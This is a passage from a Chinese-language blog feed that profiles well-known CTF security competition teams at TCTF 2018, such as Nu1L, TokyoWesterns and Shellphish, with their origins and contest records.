Micro 2016 、2017。该战队表示，多次参加比赛除了获得优秀的成绩之外，更主要的是为回馈社会。</p><p>在TCTF 2018，他们将全力以赴，展示战队的安全技术和挑战能力，并取得好成绩。</p><h3 id="战队：无限的可能性"><a href="#战队：无限的可能性" class="headerlink" title="******战队：无限的可能性"></a><code>******战队</code>：无限的可能性</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833846884.webp" alt="img"></p><p> 战队由复旦大学在校生和已毕业的各领域专家共同组成，队名六颗星星代指六个通配符，意为无限的可能性。自2014年成立以来，战队在很多比赛中取得了优异的成绩，曾获XCTF 2014成都分站赛第三，ACTF 2015冠军，SSCTF 2016线上赛第七，0CTF 2016决赛第八。</p><p>2017年7月，战队还和腾讯eee战队、上海交大0ops战队、浙大AAA战队组成腾讯A0E联合战队，参加世界顶级黑客大会DEF CON，位列前三。</p><h4 id="专访-CTF出题战队六星队员杨森：老牌战队新的征程"><a href="#专访-CTF出题战队六星队员杨森：老牌战队新的征程" class="headerlink" title="专访*CTF出题战队六星队员杨森：老牌战队新的征程"></a><a href="https://www.xctf.org.cn/library/details/5e3826c16e9ec358323a6a85ebb651bcd2099b57/" target="_blank" rel="noopener">专访*CTF出题战队六星队员杨森：老牌战队新的征程</a></h4><h3 id="LC↯-BC战队-战斗民族心怀宇宙"><a href="#LC↯-BC战队-战斗民族心怀宇宙" class="headerlink" title="LC↯ BC战队: 战斗民族心怀宇宙"></a>LC↯ BC战队: 战斗民族心怀宇宙</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833849376.webp" alt="img"></p><p>LC↯ BC战队来自俄罗斯，战队命名颇为玄妙，灵感来源于地球的一部分构成方式。曾在2015年获得EKOPARTY CTF，PHD CTF Finals，CONFidence CTF及Belluminar Seoul等国际CTF比赛的冠军。LCBC战队还曾主办了QIWI CTF 2014和Olympic CTF 2014等比赛。战队位列CTFTIME全球排行榜2017年度全球第六、2016年度全球第四。</p><h3 id="SpamAndHex战队：多瑙河畔的传统强队"><a href="#SpamAndHex战队：多瑙河畔的传统强队" class="headerlink" title="!SpamAndHex战队：多瑙河畔的传统强队"></a>!SpamAndHex战队：多瑙河畔的传统强队</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833851822.webp" alt="img"></p><p>!SpamAndHex战队来自匈牙利布达佩斯技术经济大学的CrySyS实验室,曾获得多项国际CTF比赛冠军，例如2017WCTF世界黑客大师赛第十三名，在CTFTIME 2014年的评级中位列前二十。</p><h3 id="Nu1L战队：国内冠军拿到手软"><a href="#Nu1L战队：国内冠军拿到手软" class="headerlink" title="Nu1L战队：国内冠军拿到手软"></a>Nu1L战队：国内冠军拿到手软</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833854452.webp" alt="img"></p><p> Nu1L战队成员来自于上海科技大学、西华大学、成都信息工程大学、北京理工大学等全国多所高校，最早是由两个研究Web的同学创建，队名源于计算机中语言中经常出现的“NULL”。Nu1L战队的小伙伴们都对信息安全以及CTF比赛有着浓厚的兴趣，他们在过去的比赛中战绩辉煌，曾获SCTF 2016冠军、LCTF 2016冠军、第一届百度杯信息攻防总决赛冠军、NJCTF 2017冠军、BCTF 2017冠军、LCTF 2017冠军、TCTF 2017新人邀请赛亚军、第三届XCTF总决赛季军，同时主办了N1CTF 2018，是冲击本届TCTF冠军的有力竞争者。</p><h3 id="TokyoWesterns战队：来自东京的极客"><a href="#TokyoWesterns战队：来自东京的极客" class="headerlink" title="TokyoWesterns战队：来自东京的极客"></a>TokyoWesterns战队：来自东京的极客</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833856983.webp" alt="img"></p><p>TokyoWesterns战队成员均在东京西部生活或是上学，战队名称因此得来；曾获得日本SEC CON等国际赛事冠军，CTFTIME全球排行榜2017年度全球第五位，目前排名也在全球前十位。同时，作为赛事主办方，TokyoWesterns战队也可圈可点，已连续举办三届Tokyo Westerns CTF。</p><h3 id="ROIS战队：-把兴趣做到极致"><a href="#ROIS战队：-把兴趣做到极致" class="headerlink" title="ROIS战队： 把兴趣做到极致"></a>ROIS战队： 把兴趣做到极致</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833861967.webp" alt="img"></p><p>ROIS战队是由福州大学数学与计算机科学、软件工程学院的同学组成的团队，得到了网络系统信息安全福建省高校重点实验室老师的指导。团队分为核心小组和兴趣小组，旨在为对信息安全有兴趣的同学提供技术交流和学习平台，主要参加各类CTF比赛以及为校园网络做安全测试。ROIS战队曾在首届XCTF联赛上海站决赛中获得第四名，并在最终总决赛中获得季军，在CTFTIME 2016年度的排名中位列第八十六。</p><h3 id="Shellphish战队-看到漏洞威胁就像普通人看到颜色一样"><a href="#Shellphish战队-看到漏洞威胁就像普通人看到颜色一样" class="headerlink" title="Shellphish战队: 看到漏洞威胁就像普通人看到颜色一样"></a>Shellphish战队: 看到漏洞威胁就像普通人看到颜色一样</h3><p><img src="http://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/%E5%9B%BD%E5%86%85%E5%A4%96%E6%9D%B0%E5%87%BA%E7%9A%84CTF%E6%88%98%E9%98%9F.assets/640-1526833864005.webp" alt="img"></p><p>Shellphish是来自美国的战队，战队成员遍布美国、法国、中国、巴西和塞内加尔等国，规模庞大，曾获得TCTF 2017国际赛的冠军。Shellphish战队的部分成员还参加了美国国防部高级研究计划局（DARPA）主办的Cyber Grand 挑战赛的决赛，并从中获得了75万美元的奖金，在CTFTIME 2017年度的排名中位列第9，2015年位列第4。他们对极客技术有着近乎疯狂的痴迷，自称“看到漏洞威胁就像普通人看到颜色一样”。</p><h3 id="217"><a href="#217" class="headerlink" title="217"></a>217</h3><p>来自中国宝岛台湾，台湾大学的战队，CTFTIME全球排名2016年第6，在国内国际赛场战果丰硕，曾获首届XCTF联赛总决赛冠军，在国际重量级赛事Plaid CTF及SECCON CTF中也均取得过第一名的好成绩。 </p><h3 id="403-Forbidden"><a href="#403-Forbidden" class="headerlink" title="403 Forbidden"></a>403 Forbidden</h3><p>同样也是来自宝岛台湾的战队，是台湾著名战队HITCON的成员，HITCON曾获得2016年DEF CON CTF第4名，2017年Boston Key Party CTF冠军。403 Forbidden以本次在TCTF国际赛中的成绩，暂居CTFTIME全球排名第97。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;因为觉得自己和同学只是会打打CTF，对国际和国内一些Team不是很了解，特地开了这篇博客,本文的资料均来自下方链接，目前主要内容来自 公众号：&lt;a href=&quot;javascript:void(0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;腾讯安全联合实验室&lt;/a&gt;;) ，&lt;a href=&quot;https://www.xctf.org.cn/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;XCTF社区&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF Team" scheme="http://blog.Lhaihai.wang/tags/CTF-Team/"/>
    
  </entry>
  
</feed>
